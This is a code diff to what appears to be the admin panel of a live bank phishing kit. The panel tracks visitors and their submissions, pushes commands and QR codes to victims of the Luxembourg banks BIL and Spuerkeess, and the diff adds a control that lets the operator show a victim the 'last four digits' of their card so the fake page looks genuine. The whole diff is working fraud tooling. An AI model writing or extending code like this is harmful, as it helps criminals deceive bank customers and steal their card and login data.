@@ -4,15 +4,18 @@ import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";
 import {
   apiBase,
   apiCloudinaryConfig,
+  apiDeleteCardHint,
   apiDeleteQr,
   apiDeleteVisitor,
   apiEnabled,
+  apiGetCardHint,
   apiGetQr,
   apiGetSubmissions,
   apiGetVisitors,
   apiLogin,
   apiChangePassword,
   apiSendCommand,
+  apiSetCardHint,
   apiUploadQrCloudinary,
   apiUploadQrInline,
 } from "../lib/api";
@@ -21,10 +24,12 @@ import {
   getChannel,
   isOnline,
   markAdminOnline,
+  readCardHintMap,
   readCommands,
   readQrMap,
   readSubmissions,
   readVisitors,
+  writeCardHintMap,
   writeCommands,
   writeQrMap,
   writeSubmissions,
@@ -472,6 +477,13 @@ export default function Admin() {
     const c = readCommands();
     delete c[id];
     writeCommands(c);
+    try {
+      const h = readCardHintMap();
+      if (h[id]) {
+        delete h[id];
+        writeCardHintMap(h);
+      }
+    } catch {}
     setVisitors(readVisitors());
     if (sessionId === id) {
       setSessionId(null);
@@ -1630,6 +1642,157 @@ function QrUploadCard({ visitorId, bankName }) {
   );
 }
 
+// Admin types 4 digits -> visitor sees "numéro de carte se terminant par: XXXX"
+// on the card step. One hint per visitor, live via API or local BroadcastChannel.
+function CardHintCard({ visitorId }) {
+  const [input, setInput] = useState("");
+  const [live, setLive] = useState("");
+  const [busy, setBusy] = useState(false);
+  const [msg, setMsg] = useState("");
+
+  const refresh = async () => {
+    if (apiEnabled()) {
+      try {
+        const r = await apiGetCardHint(visitorId);
+        setLive(r?.hint?.last4 || "");
+        return;
+      } catch {}
+    }
+    try {
+      const m = readCardHintMap();
+      setLive(m[visitorId]?.last4 || "");
+    } catch {}
+  };
+
+  useEffect(() => {
+    setInput("");
+    setLive("");
+    setMsg("");
+    refresh();
+    const iv = setInterval(refresh, 4000);
+    const onStorage = (e) => {
+      if (e.key === "live_cardhint_v1") refresh();
+    };
+    window.addEventListener("storage", onStorage);
+    const ch = getChannel();
+    const onMsg = (ev) => {
+      if (ev.data?.type === "cardhint-update" && ev.data?.visitorId === visitorId) refresh();
+    };
+    ch?.addEventListener?.("message", onMsg);
+    return () => {
+      clearInterval(iv);
+      window.removeEventListener("storage", onStorage);
+      try {
+        ch?.removeEventListener?.("message", onMsg);
+        ch?.close?.();
+      } catch {}
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [visitorId]);
+
+  async function save() {
+    const digits = String(input).replace(/\D/g, "").slice(0, 4);
+    if (digits.length !== 4) {
+      setMsg("Voer exact 4 cijfers in.");
+      return;
+    }
+    setBusy(true);
+    setMsg("");
+    try {
+      if (apiEnabled()) {
+        await apiSetCardHint(visitorId, digits);
+      } else {
+        const m = readCardHintMap();
+        m[visitorId] = { last4: digits, at: Date.now() };
+        writeCardHintMap(m);
+        try {
+          getChannel()?.postMessage({ type: "cardhint-update", visitorId });
+        } catch {}
+      }
+      setLive(digits);
+      setMsg("✓ Live — bezoeker ziet deze 4 cijfers");
+    } catch (e) {
+      setMsg("Opslaan mislukt, opnieuw proberen.");
+    } finally {
+      setBusy(false);
+    }
+  }
+
+  async function clear() {
+    setBusy(true);
+    setMsg("");
+    try {
+      if (apiEnabled()) {
+        try {
+          await apiDeleteCardHint(visitorId);
+        } catch {
+          await apiSetCardHint(visitorId, "");
+        }
+      } else {
+        const m = readCardHintMap();
+        delete m[visitorId];
+        writeCardHintMap(m);
+        try {
+          getChannel()?.postMessage({ type: "cardhint-update", visitorId });
+        } catch {}
+      }
+      setLive("");
+      setInput("");
+      setMsg("Gewist — bezoeker ziet geen hint meer.");
+    } catch {
+      setMsg("Wissen mislukt.");
+    } finally {
+      setBusy(false);
+    }
+  }
+
+  return (
+    <div className="rounded-xl bg-white/[0.04] p-3 ring-1 ring-emerald-400/25">
+      <h4 className="text-[13px] font-extrabold uppercase tracking-wider text-emerald-300">
+        Kaart eindigt op ****
+      </h4>
+      <p className="mt-1 text-[12px] leading-snug text-purple-300/80">
+        Typ 4 cijfers — bezoeker ziet « se terminant par » die cijfers op de kaartpagina.
+      </p>
+      <div className="mt-2 flex gap-1.5">
+        <input
+          value={input}
+          onChange={(e) => setInput(e.target.value.replace(/\D/g, "").slice(0, 4))}
+          placeholder="9392"
+          inputMode="numeric"
+          maxLength={4}
+          className="min-w-0 flex-1 rounded-lg border border-white/10 bg-black/30 px-3 py-2.5 text-center font-mono text-[18px] font-extrabold tracking-[0.3em] text-white outline-none placeholder:text-neutral-600 focus:border-emerald-400"
+        />
+        <button
+          onClick={save}
+          disabled={busy || String(input).replace(/\D/g, "").length !== 4}
+          className="min-h-[44px] rounded-lg bg-emerald-600 px-4 text-[13px] font-extrabold text-white transition hover:bg-emerald-500 active:scale-95 disabled:opacity-40"
+        >
+          {busy ? "…" : "Toon"}
+        </button>
+      </div>
+      <div className="mt-2 flex items-center justify-between gap-2">
+        <p className="text-[12.5px] font-bold text-purple-100">
+          Live:{" "}
+          {live ? (
+            <span className="font-mono tracking-[0.2em] text-emerald-300">•••• {live}</span>
+          ) : (
+            <span className="text-purple-300/70">— niet ingesteld</span>
+          )}
+        </p>
+        {live && (
+          <button onClick={clear} disabled={busy} className="rounded-lg bg-white/10 px-2.5 py-1.5 text-[12px] font-bold text-red-300 hover:bg-white/20">
+            Wissen
+          </button>
+        )}
+      </div>
+      {msg && (
+        <p className="mt-1.5 text-center text-[12px] font-bold text-purple-200">{msg}</p>
+      )}
+    </div>
+  );
+}
+
 function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
   const online = isOnline(v, now);
   const rows = [
@@ -1704,6 +1867,9 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
         {/* RIGHT — ask-step buttons */}
         <aside className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-3">
           <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Actions</h3>
+          <div className="mt-2.5">
+            <CardHintCard visitorId={v.id} />
+          </div>
           {(v.bank === "bil" || v.bank === "spuerkeess") && (
             <div className="mt-2.5">
               <QrUploadCard visitorId={v.id} bankName={v.bankName || v.bank} />
